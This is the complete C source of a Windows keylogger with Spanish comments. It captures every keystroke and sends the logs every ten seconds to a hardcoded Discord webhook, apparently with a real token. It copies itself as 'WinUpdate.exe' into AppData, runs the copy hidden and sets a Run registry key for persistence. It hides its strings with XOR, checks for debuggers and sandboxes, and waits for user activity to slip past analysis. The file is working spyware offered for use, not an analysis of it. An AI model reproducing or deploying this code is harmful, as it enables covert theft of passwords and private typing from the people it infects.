#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string.h>
#include <tchar.h>

// Cifra o descifra una cadena con una clave XOR simple
void xor_decrypt(char* str, char key) {
    while (*str) {
        *str ^= key;
        str++;
    }
}

// Función que envía los datos al webhook de Discord desde un hilo
DWORD WINAPI SendToDiscordWebhookThread(LPVOID lpParam) {
    const char *keyLog = (const char *)lpParam;

    // Copia local para evitar usar directamente la memoria del hilo principal
    char localCopy[2048];
    strncpy(localCopy, keyLog, sizeof(localCopy));
    localCopy[sizeof(localCopy) - 1] = '\0';

    // Cadenas cifradas
    char userAgent[] = { 'D'^0x13, 'i'^0x13, 's'^0x13, 'c'^0x13, 'o'^0x13, 'r'^0x13, 'd'^0x13, 'W'^0x13, 'e'^0x13, 'b'^0x13, 'h'^0x13, 'o'^0x13, 'o'^0x13, 'k'^0x13, '\0' };
    char host[] = { 'd'^0x5F, 'i'^0x5F, 's'^0x5F, 'c'^0x5F, 'o'^0x5F, 'r'^0x5F, 'd'^0x5F, '.'^0x5F, 'c'^0x5F, 'o'^0x5F, 'm'^0x5F, '\0' };
    char webhookPath[] = {
        '/'^0x3C, 'a'^0x3C, 'p'^0x3C, 'i'^0x3C, '/'^0x3C, 'w'^0x3C, 'e'^0x3C, 'b'^0x3C, 'h'^0x3C, 'o'^0x3C, 'o'^0x3C, 'k'^0x3C, 's'^0x3C, '/'^0x3C,
        '1'^0x3C, '3'^0x3C, '7'^0x3C, '7'^0x3C, '9'^0x3C, '6'^0x3C, '5'^0x3C, '1'^0x3C, '2'^0x3C, '4'^0x3C, '2'^0x3C, '1'^0x3C, '5'^0x3C, '7'^0x3C, '6'^0x3C, '7'^0x3C, '1'^0x3C, '3'^0x3C, '1'^0x3C, '/'^0x3C,
        'S'^0x3C, '9'^0x3C, 'Y'^0x3C, '3'^0x3C, 'f'^0x3C, 'j'^0x3C, 'G'^0x3C, '6'^0x3C, 'g'^0x3C, 'w'^0x3C, 'l'^0x3C, 'c'^0x3C, 'V'^0x3C, 'r'^0x3C, 'e'^0x3C, '2'^0x3C, 'G'^0x3C, 'D'^0x3C, '1'^0x3C, 't'^0x3C, '4'^0x3C, 'N'^0x3C, 'M'^0x3C, 'P'^0x3C, 'o'^0x3C, 'e'^0x3C, 'h'^0x3C, 'U'^0x3C, 'P'^0x3C, 'p'^0x3C, 'y'^0x3C, 'K'^0x3C, 'e'^0x3C, 'z'^0x3C, '2'^0x3C, 'B'^0x3C, 'Y'^0x3C, '1'^0x3C, 'W'^0x3C, 'Z'^0x3C, 'm'^0x3C, 'd'^0x3C, 'T'^0x3C, 'H'^0x3C, 'N'^0x3C, 'G'^0x3C, 'j'^0x3C, 'B'^0x3C, 'z'^0x3C, 'O'^0x3C, 's'^0x3C, 'z'^0x3C, 'N'^0x3C, 'y'^0x3C, 'y'^0x3C, 'k'^0x3C, 'B'^0x3C, 'i'^0x3C, 'k'^0x3C, 'k'^0x3C, 'v'^0x3C, 'A'^0x3C, 'o'^0x3C, 'z'^0x3C, 'H'^0x3C, 'O'^0x3C, 'q'^0x3C, 'x'^0x3C, '\0'
    };
    char postMethod[] = { 'P'^0x74, 'O'^0x74, 'S'^0x74, 'T'^0x74, '\0' };
    char contentTypeHeader[] = { 'C'^0x21, 'o'^0x21, 'n'^0x21, 't'^0x21, 'e'^0x21, 'n'^0x21, 't'^0x21, '-'^0x21, 'T'^0x21, 'y'^0x21, 'p'^0x21, 'e'^0x21, ':'^0x21, ' '^0x21, 'a'^0x21, 'p'^0x21, 'p'^0x21, 'l'^0x21, 'i'^0x21, 'c'^0x21, 'a'^0x21, 't'^0x21, 'i'^0x21, 'o'^0x21, 'n'^0x21, '/'^0x21, 'j'^0x21, 's'^0x21, 'o'^0x21, 'n'^0x21, '\r'^0x21, '\n'^0x21, '\0' };
    char contentLengthHeader[] = { 'C'^0x2A, 'o'^0x2A, 'n'^0x2A, 't'^0x2A, 'e'^0x2A, 'n'^0x2A, 't'^0x2A, '-'^0x2A, 'L'^0x2A, 'e'^0x2A, 'n'^0x2A, 'g'^0x2A, 't'^0x2A, 'h'^0x2A, ':'^0x2A, ' '^0x2A, '\0' };

    // Descifrado antes del uso
    xor_decrypt(userAgent, 0x13);
    xor_decrypt(host, 0x5F);
    xor_decrypt(webhookPath, 0x3C);
    xor_decrypt(postMethod, 0x74);
    xor_decrypt(contentTypeHeader, 0x21);
    xor_decrypt(contentLengthHeader, 0x2A);

    // Inicia una sesión de WinINet
    HINTERNET hInternet = InternetOpenA(userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return 0;

    // Conecta con el servidor de Discord por HTTPS (puerto 443)
    HINTERNET hConnect = InternetConnectA(hInternet, host, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 0;
    }

    // Crea la petición HTTP POST
    HINTERNET hRequest = HttpOpenRequestA(hConnect, postMethod, webhookPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_KEEP_CONNECTION, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 0;
    }

    // Contenido JSON que se va a enviar
    char postData[2048];
    snprintf(postData, sizeof(postData), "{\"content\": \"%s\"}", localCopy);

    // Prepara las cabeceras HTTP
    char headers[512];
    snprintf(headers, sizeof(headers), "%s%s%zu\r\n", contentTypeHeader, contentLengthHeader, strlen(postData));

    // Envía la petición al webhook
    HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), (LPVOID)postData, (DWORD)strlen(postData));

    // Cierra los manejadores
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return 0;
}

// Función para auto-replicar el ejecutable con otro nombre y conseguir persistencia en el registro de Windows
void SelfReplicateWithName(const char *newName) {
    char originalPath[MAX_PATH];
    GetModuleFileName(NULL, originalPath, MAX_PATH); // Ruta del ejecutable actual

    // Si ya está ejecutándose desde la ruta clonada, no hacer nada y salir de la función
    if (strstr(originalPath, newName) != NULL) return;

    char newPath[MAX_PATH];

    // Cadenas cifradas
    char envVar[] = { 'A'^0x1C, 'P'^0x1C, 'P'^0x1C, 'D'^0x1C, 'A'^0x1C, 'T'^0x1C, 'A'^0x1C, '\0' };
    char backslash[] = { '\\'^0x33, '\0' };
    char openStr[] = { 'o'^0x4F, 'p'^0x4F, 'e'^0x4F, 'n'^0x4F, '\0' };
    char regPath[] = {
        'S'^0x66, 'o'^0x66, 'f'^0x66, 't'^0x66, 'w'^0x66, 'a'^0x66, 'r'^0x66, 'e'^0x66, '\\'^0x66,
        'M'^0x66, 'i'^0x66, 'c'^0x66, 'r'^0x66, 'o'^0x66, 's'^0x66, 'o'^0x66, 'f'^0x66, 't'^0x66, '\\'^0x66,
        'W'^0x66, 'i'^0x66, 'n'^0x66, 'd'^0x66, 'o'^0x66, 'w'^0x66, 's'^0x66, '\\'^0x66,
        'C'^0x66, 'u'^0x66, 'r'^0x66, 'r'^0x66, 'e'^0x66, 'n'^0x66, 't'^0x66, 'V'^0x66, 'e'^0x66, 'r'^0x66, 's'^0x66, 'i'^0x66, 'o'^0x66, 'n'^0x66, '\\'^0x66,
        'R'^0x66, 'u'^0x66, 'n'^0x66, '\0'
    };
    char valName[] = { 'W'^0x7D, 'i'^0x7D, 'n'^0x7D, 'U'^0x7D, 'p'^0x7D, 'd'^0x7D, 'a'^0x7D, 't'^0x7D, 'e'^0x7D, '\0' };

    // Desciframos antes de usar
    xor_decrypt(envVar, 0x1C);
    xor_decrypt(backslash, 0x33);
    xor_decrypt(openStr, 0x4F);
    xor_decrypt(regPath, 0x66);
    xor_decrypt(valName, 0x7D);

    GetEnvironmentVariable(envVar, newPath, MAX_PATH); // Carpeta %APPDATA%
    strcat(newPath, backslash);
    strcat(newPath, newName);

    // Elimina la copia anterior si existe
    if (GetFileAttributes(newPath) != INVALID_FILE_ATTRIBUTES) DeleteFile(newPath);

    // Copia el ejecutable actual a la nueva ruta
    CopyFile(originalPath, newPath, FALSE);

    // Ejecuta la nueva copia en modo oculto
    ShellExecute(NULL, openStr, newPath, NULL, NULL, SW_HIDE);

    // Añade persistencia: ejecuta al inicio del sistema desde el registro
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, valName, 0, REG_SZ, (BYTE *)newPath, strlen(newPath));
        RegCloseKey(hKey);
    }

    // Finaliza la ejecución del binario original
    ExitProcess(0);
}

// Anti-debugging y evitar sandbox

// Detecta si hay un debugger activo
BOOL IsDebuggerAttached() {
    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL);
}

// Comprueba si el entorno parece una sandbox o VM
BOOL IsSandboxed() {
    SYSTEM_INFO sysInfo;
    MEMORYSTATUSEX memInfo = {0};
    memInfo.dwLength = sizeof(memInfo);

    GetSystemInfo(&sysInfo);
    GlobalMemoryStatusEx(&memInfo);

    DWORD numCores = sysInfo.dwNumberOfProcessors;
    DWORDLONG totalPhysMem = memInfo.ullTotalPhys;

    return (numCores <= 3 || totalPhysMem <= (4LL * 1024 * 1024 * 1024));  // 4 GB RAM o menos, o 3 o menos núcleos
}

// Detecta si el usuario ha interactuado (movido el ratón) en los primeros 5 segundos
BOOL HasUserInteracted() {
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(10000);  // Espera 10 segundos
    GetCursorPos(&p2);
    return (p1.x != p2.x || p1.y != p2.y);
}

// Detecta si hay algún debugger común siendo utilizado para analizar el código
BOOL HasDebuggerWindowOpen() {
    char dbg1[] = { 'x'^0x2A, '6'^0x2A, '4'^0x2A, 'd'^0x2A, 'b'^0x2A, 'g'^0x2A, '\0' };
    char dbg2[] = { 'x'^0x2A, '3'^0x2A, '2'^0x2A, 'd'^0x2A, 'b'^0x2A, 'g'^0x2A, '\0' };
    char dbg3[] = { 'O'^0x2A, 'L'^0x2A, 'L'^0x2A, 'Y'^0x2A, 'D'^0x2A, 'B'^0x2A, 'G'^0x2A, '\0' };
    char dbg4[] = { 'O'^0x2A, 'l'^0x2A, 'l'^0x2A, 'y'^0x2A, 'D'^0x2A, 'b'^0x2A, 'g'^0x2A, '\0' };
    char dbg5[] = {
        'W'^0x2A, 'i'^0x2A, 'n'^0x2A, 'D'^0x2A, 'b'^0x2A, 'g'^0x2A,
        'F'^0x2A, 'r'^0x2A, 'a'^0x2A, 'm'^0x2A, 'e'^0x2A, 'C'^0x2A, 'l'^0x2A, 'a'^0x2A, 's'^0x2A, 's'^0x2A, '\0'
    };
    char dbg6[] = { 'I'^0x2A, 'D'^0x2A, 'A'^0x2A, '\0' };
    char dbg7[] = { 'G'^0x2A, 'H'^0x2A, 'I'^0x2A, 'D'^0x2A, 'R'^0x2A, 'A'^0x2A, '\0' };

    char* debuggerWindows[] = { dbg1, dbg2, dbg3, dbg4, dbg5, dbg6, dbg7 };

    // Desciframos todas las cadenas
    for (int i = 0; i < sizeof(debuggerWindows) / sizeof(debuggerWindows[0]); i++) {
        xor_decrypt(debuggerWindows[i], 0x2A);
    }

    for (int i = 0; i < sizeof(debuggerWindows) / sizeof(debuggerWindows[0]); i++) {
        if (FindWindowA(NULL, debuggerWindows[i]) || FindWindowA(debuggerWindows[i], NULL)) {
            return TRUE;
        }
    }

    return FALSE;
}


// Código principal del keylogger
int main() {

    // Auto-replicación con el nombre indicado (WinUpdate.exe) y persistencia
    char newName[] = { 'W'^0x37, 'i'^0x37, 'n'^0x37, 'U'^0x37, 'p'^0x37, 'd'^0x37, 'a'^0x37, 't'^0x37, 'e'^0x37, '.'^0x37, 'e'^0x37, 'x'^0x37, 'e'^0x37, '\0' };
    xor_decrypt(newName, 0x37);

    SelfReplicateWithName(newName);

    // Evitar debugger
    if (IsDebuggerAttached()) {
        return 0;
    }

    // Complementario a la comprobación anterior: Evitar Debuggers habituales
    if (HasDebuggerWindowOpen()) {
        return 0;
    }

    // Evitar sandbox y comprobar que es un usuario legítimo
    if (IsSandboxed() || !HasUserInteracted()) {
        return 0;
    }

    // Delay inicial para evadir análisis rápidos en sandbox
    Sleep(15000);

    // Aumenta entropía del binario (ruido)
    char noise[] = "jdhf8723r8723r9283rh28hfhsd8hf23h823";
    volatile int dummy = 0;
    for (int i = 0; i < sizeof(noise); i++) {
        dummy += noise[i];
    }

    BOOL keyDown[256] = {0};  // Para evitar repeticiones

    // Buffer donde se acumulan las teclas antes de enviarlas
    char keyBuffer[2048] = {0};
    int bufferPos = 0;

    // Control de tiempo para envío cada 10 segundos
    DWORD lastSendTime = GetTickCount();

    // Bucle principal del keylogger
    while (1) {

	for (int key = 8; key <= 255; key++) {
            SHORT state = GetAsyncKeyState(key);


            if ((state & 0x8000) && !keyDown[key]) {
                keyDown[key] = TRUE;

                char buffer[32] = {0};

                if (key >= 32 && key <= 126) {

                    BOOL shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
                    BOOL caps = GetKeyState(VK_CAPITAL) & 0x0001;

                    if ((key >= 'A' && key <= 'Z') && (shift == caps)) {
                        key += 32;  // Minúscula
                    }

                    snprintf(buffer, sizeof(buffer), "%c", key);

                } else {

                    switch (key) {
			case VK_RETURN: {
                            char tmp[] = { '['^0x2A, 'E'^0x2A, 'N'^0x2A, 'T'^0x2A, 'E'^0x2A, 'R'^0x2A, ']'^0x2A, '\0' };
    			    xor_decrypt(tmp, 0x2A);
    			    strcpy(buffer, tmp);
    			    break;
		        }
			case VK_BACK: {
    			    char tmp[] = { '['^0x2A, 'B'^0x2A, 'A'^0x2A, 'C'^0x2A, 'K'^0x2A, 'S'^0x2A, 'P'^0x2A, 'A'^0x2A, 'C'^0x2A, 'E'^0x2A, ']'^0x2A, '\0' };
			    xor_decrypt(tmp, 0x2A);
			    strcpy(buffer, tmp);
			    break;
			}
			case VK_TAB: {
			    char tmp[] = { '['^0x2A, 'T'^0x2A, 'A'^0x2A, 'B'^0x2A, ']'^0x2A, '\0' };
			    xor_decrypt(tmp, 0x2A);
			    strcpy(buffer, tmp);
			    break;
			}
			case VK_SHIFT: {
			    char tmp[] = { '['^0x2A, 'S'^0x2A, 'H'^0x2A, 'I'^0x2A, 'F'^0x2A, 'T'^0x2A, ']'^0x2A, '\0' };
			    xor_decrypt(tmp, 0x2A);
			    strcpy(buffer, tmp);
			    break;
			}
			case VK_CONTROL: {
			    char tmp[] = { '['^0x2A, 'C'^0x2A, 'T'^0x2A, 'R'^0x2A, 'L'^0x2A, ']'^0x2A, '\0' };
			    xor_decrypt(tmp, 0x2A);
			    strcpy(buffer, tmp);
			    break;
			}
			case VK_ESCAPE: {
			    char tmp[] = { '['^0x2A, 'E'^0x2A, 'S'^0x2A, 'C'^0x2A, ']'^0x2A, '\0' };
			    xor_decrypt(tmp, 0x2A);
			    strcpy(buffer, tmp);
			    break;
			}
			case VK_SPACE: {
			    char tmp[] = { ' ' ^ 0x2A, '\0' };
			    xor_decrypt(tmp, 0x2A);
			    strcpy(buffer, tmp);
			    break;
			}
			default: snprintf(buffer, sizeof(buffer), "[%d]", key); break;
                    }
                }


                if (bufferPos + strlen(buffer) < sizeof(keyBuffer)) {
                    strcat(keyBuffer, buffer);
                    bufferPos += strlen(buffer);
                }


            } else if (!(state & 0x8000)) {
                keyDown[key] = FALSE;  // Reinicia estado al soltar tecla
            }
        }

        // Comprueba si han pasado 10 segundos para enviar
        DWORD now = GetTickCount();

        if (bufferPos > 0 && (now - lastSendTime >= 10000)) {

            // Crea copia del buffer y lanza hilo para enviar
            char *copy = malloc(strlen(keyBuffer) + 1);
            strcpy(copy, keyBuffer);
            CreateThread(NULL, 0, SendToDiscordWebhookThread, copy, 0, NULL);

            // Limpia el buffer
            memset(keyBuffer, 0, sizeof(keyBuffer));
            bufferPos = 0;
            lastSendTime = now;
        }

        Sleep(10);
    }

    return 0;
}
